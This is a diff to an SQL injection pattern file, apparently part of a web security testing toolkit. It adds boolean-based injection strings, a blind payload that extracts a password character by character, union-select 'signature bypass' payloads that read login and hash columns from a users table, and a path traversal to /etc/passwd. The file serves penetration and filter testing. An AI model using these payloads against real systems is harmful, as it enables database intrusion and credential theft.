@@ -43,7 +43,7 @@
 #?      csv2xml.pl
 #?
 #? VERSION
-#?      @(#) sqlPattern.txt 3.10 11/12/04 19:43:12
+#?      @(#) %M% %I% %E% %U%
 #?
 #? AUTHOR
 #?      17-feb-08 Achim Hoffmann, mailto: EnDe (at) my (dash) stp (dot) net
@@ -214,7 +214,12 @@ MySQL	*	*	x' IS\N|!'
 *	*	*	x' IS \N|! '
 *	*	*	x' IS \N - ! '
 *	*	*	x' IS \N = '
+*	*	*	x' AND null IS null #
+*	*	*	x' AND 1 IS null #
+*	*	*	x' AND 1 IS NOT null #
 *	*	*	x' OR null IS null #
+*	*	*	x' OR 1 IS null #
+*	*	*	x' OR 1 IS NOT null #
 *	*	*	x' OR-1='-1
 *	*	*	x' OR!1='!1
 *	*	*	x' OR!(1)='1
@@ -499,10 +504,35 @@ Postgre	*	*	select cast(version() as numeric)--
 Postgre	*	*	select cast((select table_name from information_schema.tables limit 1 offset 0) as numeric)--
 Postgre	*	*	select cast((select table_name from information_schema.tables limit 1 offset 1) as numeric)--
 Oracle	Oracle>9.0	*	1 and(1)=(select upper(XMLType(chr(60)||chr(58)||chr(58)||(select replace(banner,chr(32),chr(58)) from sys.v_$version where rownum=1)||chr(62))) from dual)--
+*	*	*	id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
 
 LABEL	error-based (blind) injection tests
 Sybase	*	*	RAND((SELECT COUNT(*) FROM table)%2b900000000000)
 Sybase	*	*	RAND(ASCII(SUBSTRING(user,1,1))%2b900000000000)
+
+LABEL	signature bypass examples
+*	*	*	1 or 0x50=0x50
+*	*	*	(1)or(0x50=0x50)
+*	*	*	1 union (select 'foo'from table)
+*	*	*	(1)union(select(1),mid(hash,1,32)from(users))
+*	*	*	1 union (select'1',concat(login,hash)from users)
+*	*	*	(1)union(((((((select(1),hex(hash)from(users))))))))
+*	*	*	/union%20select/../../../../../../../etc/passwd
+
+LABEL	misc functions
+*	*	*	ascii()
+*	*	*	bin()
+*	*	*	hex()
+*	*	*	mid()
+*	*	*	left()
+*	*	*	ord()
+*	*	*	locate()
+*	*	*	position()
+*	*	*	lower()
+*	*	*	strcmp()
+*	*	*	substring()
+*	*	*	substr()
+*	*	*	sleep()
 
 #LABEL	misc
 
